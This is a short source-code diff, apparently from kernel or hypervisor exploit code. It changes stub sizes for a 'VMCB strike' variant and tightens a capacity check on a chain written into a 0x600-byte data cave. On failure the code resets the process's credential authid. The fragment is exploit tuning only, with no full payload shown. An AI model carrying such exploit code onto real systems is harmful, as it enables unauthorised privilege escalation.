@@ -85,8 +85,8 @@
 #define STUB_QWORDS         8U
 #define PROBE_STEM          "fixed-ap-arg"
 #elif defined(AP_VMCB_STRIKE_1270)
-#define STUB_BYTES          224U
-#define STUB_QWORDS         28U
+#define STUB_BYTES          211U
+#define STUB_QWORDS         27U
 #define PROBE_STEM          "fixed-ap-vmcb-strike"
 #elif defined(AP_VMCB_SURVEY_1270)
 #define STUB_BYTES          170U
@@ -712,10 +712,12 @@ int main(void)
 #endif
 
   // The one-shot marker precedes this chain in the 0x600-byte data cave.
-  if (sizeof(uint64_t) * 5 + store_chain.len > BIG_SAVE_BYTES) {
+  if (sizeof(uint64_t) * 5 + store_chain.len + 0x100 >
+      BIG_SAVE_BYTES) {
     kernel_set_ucred_authid(getpid(), authid);
     klog("AFP1270,1,stop,stage=chain-capacity,bytes=%zu,capacity=%u\n",
-         sizeof(uint64_t) * 5 + store_chain.len, BIG_SAVE_BYTES);
+         sizeof(uint64_t) * 5 + store_chain.len + 0x100,
+         BIG_SAVE_BYTES);
     return 5;
   }
 
